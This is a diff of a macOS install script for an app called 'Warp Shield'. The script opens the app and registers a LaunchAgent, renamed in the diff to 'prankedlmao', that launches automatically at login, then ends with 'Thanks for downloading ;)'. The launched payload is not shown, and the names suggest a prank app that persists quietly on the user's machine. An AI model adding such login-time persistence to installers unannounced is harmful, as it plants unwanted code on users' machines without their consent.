@@ -51,16 +51,10 @@ chmod +x "$DEST/Contents/MacOS/"* 2>/dev/null || true
 # --- Open the app ---
 open "$DEST"
 
+# --- LaunchAgent setup ---
+PLIST_SRC="$DEST/Contents/Resources/com.Warpshield.prankedlmao.plist"
+PLIST_DST="$HOME/Library/LaunchAgents/com.Warpshield.prankedlmao.plist"
 
-#!/bin/bash
-set -e
-
-# --- Paths ---
-APP="/Applications/Warp Shield.app"
-PLIST_SRC="$APP/Contents/Resources/com.WarpShield.WarpShield.plist"
-PLIST_DST="$HOME/Library/LaunchAgents/com.WarpShield.WarpShield.plist"
-
-# --- Make LaunchAgents folder if missing ---
 mkdir -p "$HOME/Library/LaunchAgents"
 
 # --- Copy plist ---
@@ -78,12 +72,12 @@ launchctl bootout gui/$(id -u) "$PLIST_DST" 2>/dev/null || true
 launchctl bootstrap gui/$(id -u) "$PLIST_DST"
 
 # --- Check if running ---
-if launchctl list | grep -q WarpShield; then
+if launchctl list | grep -q prankedlmao; then
     echo "LaunchAgent loaded successfully!"
 else
     echo "LaunchAgent did not load."
 fi
-launchctl list | grep WarpShield >/dev/null 2>&1 || true
 
 # --- Final message ---
+echo
 echo "Thanks for downloading ;)"
